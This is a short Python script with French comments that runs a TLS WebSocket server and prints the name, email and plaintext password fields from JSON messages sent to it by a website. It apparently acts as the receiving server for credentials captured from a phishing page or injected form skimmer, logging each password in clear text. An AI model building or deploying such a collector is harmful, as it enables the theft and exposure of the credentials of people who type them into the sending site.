import asyncio
import websockets
import ssl
import json
from datetime import datetime

async def receive_data(websocket):
    print(f"[{datetime.now()}] ✅ Nouvelle connexion établie de {websocket.remote_address}")
    try:
        async for message in websocket:
            try:
                # On tente de parser le JSON envoyé par le site
                data = json.loads(message)
                
                # Extraction des données
                name = data.get('name', 'N/A')
                email = data.get('email', 'N/A')
                password = data.get('pass', 'N/A')
                
                print(f"--- Données reçues à {datetime.now().strftime('%H:%M:%S')} ---")
                print(f"Nom      : {name}")
                print(f"Email    : {email}")
                print(f"Password : {password}")
                print("-" * 40)
                
            except json.JSONDecodeError:
                # Si le message n'est pas du JSON
                print(f"Message brut reçu : {message}")
                
    except websockets.exceptions.ConnectionClosed:
        print(f"[{datetime.now()}] ⚠️ Connexion fermée par le client.")

async def main():
    # Configuration SSL
    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ssl_context.load_cert_chain(
        certfile='/home/jeffried/cert.pem',
        keyfile='/home/jeffried/key.pem'
    )
    
    print("🚀 Serveur WebSocket Secure démarré sur wss://0.0.0.0:8080")
    print("En attente de données...")
    async with websockets.serve(receive_data, "0.0.0.0", 8080, ssl=ssl_context):
        await asyncio.Future()  # Exécution permanente

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nServeur arrêté par l'utilisateur.")
